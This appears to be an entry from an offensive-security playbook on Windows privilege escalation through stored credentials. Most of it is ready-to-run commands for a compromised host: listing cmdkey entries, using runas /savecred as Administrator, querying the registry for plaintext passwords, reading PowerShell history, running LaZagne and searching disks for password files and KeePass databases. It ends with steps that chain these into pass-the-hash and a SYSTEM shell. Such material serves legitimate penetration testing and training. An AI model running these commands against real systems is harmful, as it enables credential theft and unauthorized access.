---
id: windows-stored-creds
title: Windows Stored Credentials
stage: privesc
tags: [windows]
summary: Extract plaintext credentials from cmdkey, the registry, PowerShell history, and credential managers — Winlogon autologon entries are almost always plaintext and reused.
leads_to:
  - winrm
  - pass-the-hash
  - system-shell
---

## Prerequisites

A low-privilege Windows shell. No special permissions required — these are all readable by the current user. Run all checks immediately on landing, before doing anything else.

Windows stores credentials in multiple locations: the Credential Manager (accessible via `cmdkey`), the registry (Winlogon autologon entries are plaintext), PowerShell command history, and application config files. LaZagne automates extraction across all credential stores including browsers. These credentials frequently belong to administrators and are often reused across the domain.

## Quick Win

> Three commands that cover the highest-value locations — run all three immediately on landing.

```cmd
cmdkey /list
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

## Saved Credentials (cmdkey)

> If Administrator is listed in cmdkey, use it directly without knowing the password.

```cmd
cmdkey /list
runas /savecred /user:Administrator cmd.exe
```

## Registry Credential Searches

> Winlogon autologon often stores domain credentials in plaintext — check this first.

```cmd
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

## Service ImagePath Embedded Credentials

> Service configurations sometimes embed `-u user -p password` flags directly.

```powershell
Get-ChildItem -Path HKLM:\SYSTEM\CurrentControlSet\services | ForEach-Object { $_.GetValue("ImagePath") } | Where-Object { $_ } | Select-String -Pattern "\-u |\-p |\-pass|password" -CaseSensitive:$false
```

## PowerShell History

> Admins run commands with inline passwords during setup — history captures everything.

```powershell
(Get-PSReadlineOption).HistorySavePath
Get-History
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

## LaZagne (Automated)

> Extracts credentials from all credential stores, browsers, and application configs in one run.

```powershell
.\lazagne.exe all
.\lazagne.exe browsers
.\lazagne.exe windows
```

## Config Files Search

> Plaintext passwords in .txt/.ini/.config files and KeePass databases.

```powershell
Get-ChildItem -Path C:\Users -Include *.txt,*.ini,*.config -File -Recurse -ErrorAction SilentlyContinue `
  | Select-String -Pattern "pass|cred|key" -SimpleMatch

Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
type C:\inetpub\wwwroot\web.config 2>nul
```

## Leads To

Winlogon plaintext credential → try it for WinRM access (winrm) or RDP. NTLM hash extracted → pass-the-hash across subnet. `cmdkey` Administrator saved → `runas /savecred` for immediate SYSTEM context → system-shell. KeePass database found → extract master password → full credential store access.
